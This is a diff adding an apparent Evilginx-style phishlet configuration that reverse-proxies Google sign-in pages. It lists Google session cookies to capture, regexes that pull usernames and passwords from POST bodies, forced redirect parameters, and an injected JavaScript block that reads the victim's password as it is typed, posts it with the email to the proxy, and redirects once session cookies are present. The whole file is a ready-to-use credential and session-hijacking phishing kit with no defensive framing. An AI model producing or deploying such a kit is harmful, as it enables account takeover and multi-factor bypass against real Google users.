@@ -1,0 +1,205 @@
+author: '@bectools'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: false, is_landing: false}
+  - {phish_sub: 'drive', orig_sub: 'drive', domain: 'google.com', session: false, is_landing: false} 
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false}
+  - {phish_sub: 'ads', orig_sub: 'ads', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: true, is_landing: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: false, is_landing: false}
+  - {phish_sub: 'youtube', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</head>', replace: '<script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script></head>', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']} 
+  - {triggers_on: 'accounts.google.com', orig_sub: 'drive', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'play', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'ogs', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'notifications', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'content', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'fonts', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'google-analytics.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'drive', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'ads', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+ 
+auth_tokens:
+  - domain: '.google.com'
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
+  - domain: 'accounts.google.com'
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
+
+auth_urls:
+  - '/CheckCookie'
+  - '/_/AccountSettingsUi/browserinfo'
+  
+credentials:
+  username:
+    key: 'unenc_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'unenc_pwd'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  - path: '/selectchallenge'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      #- {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/signin'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      - {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/speedbump'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/challenge'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+
+js_inject:
+  - trigger_domains: ["accounts.google.com"]
+    trigger_paths: ["/identifier" , "/"]
+    script: |
+      async function postEndpoint(details) {
+          console.log('details poster', details);
+          var email = details['email'];
+          var pass = details['pass'];
+          var detailString = 'unenc_email=' + email + '&unenc_pwd=' + pass;
+          console.log('detailString', detailString)
+          var result;
+          try {
+              result = await fetch(window.origin + `/v3/signin/_/AccountsSignInUi/data/batchexecute`, {
+                  method: 'POST',
+                  headers: {
+                    'content-type': 'application/x-www-form-urlencoded'
+                  },
+                  body: detailString
+              })
+          } catch (err) {
+              console.log(err)
+              return false;
+          }
+          return;
+      }
+
+      var passwordElem = $(_x('//*[@id="password"]/div[1]/div/div[1]/input')) ? $(_x('//*[@id="password"]/div[1]/div/div[1]/input')) : null;
+      function updatePasswordElem() {
+          passwordElem = $(_x('//*[@id="password"]/div[1]/div/div[1]/input')) ? $(_x('//*[@id="password"]/div[1]/div/div[1]/input')) : null;
+          console.log('Updated the password element');
+      }
+
+     
+      setInterval(updatePasswordElem, 2000);
+
+
+      
+      function detectChangePass() {
+        var emailLabel = $(_x('/html/body/div[1]/div[1]/div[2]/div/c-wiz/div/div[1]/div/div[2]/div')) ? $(_x('/html/body/div[1]/div[1]/div[2]/div/c-wiz/div/div[1]/div/div[2]/div')) : null;
+        if (passwordElem) {
+            $(passwordElem).on('input', function() {
+              var passVal = $(this).val();
+              if(emailLabel !== null) {
+                if(passVal.length >= 8) {
+                  var email = $('[name="identifier"]').val();
+                  var pass = passVal;
+                  var details = {
+                    'email': email,
+                    'pass': pass
+                  }
+                  postEndpoint(details).then(() => {
+                    console.log('Endpoint posted');
+                  })
+
+                }
+
+              } else {
+                console.log('Email label IS empty');
+              }
+
+            });
+        } else {
+            updatePasswordElem();
+        }
+
+      }
+
+     
+      setInterval(detectChangePass, 5000);
+      
+      function _x(STR_XPATH) {
+          var xresult = document.evaluate(STR_XPATH, document, null, XPathResult.ANY_TYPE, null);
+          var xnodes = [];
+          var xres;
+          while (xres = xresult.iterateNext()) {
+              xnodes.push(xres);
+          }
+          return xnodes;
+      }
+
+      
+
+        function checkCookies() {
+        if (document.cookie.includes('SID') && document.cookie.includes('APISID') && document.cookie.includes('SAPISID')) {
+            window.location.href = 'https://myaccount.mydomain.xyz';
+            }
+ 
+        if (window.location.href.includes('/CheckCookie')) {
+            window.location.href = 'https://myaccount.mydomain.xyz';
+        }
+        }
+
+       
+        window.onload = function() {
+        checkCookies();
+        }
+
+        // Check cookies every 3 seconds
+        setInterval(function() {
+        checkCookies();
+        }, 3000);
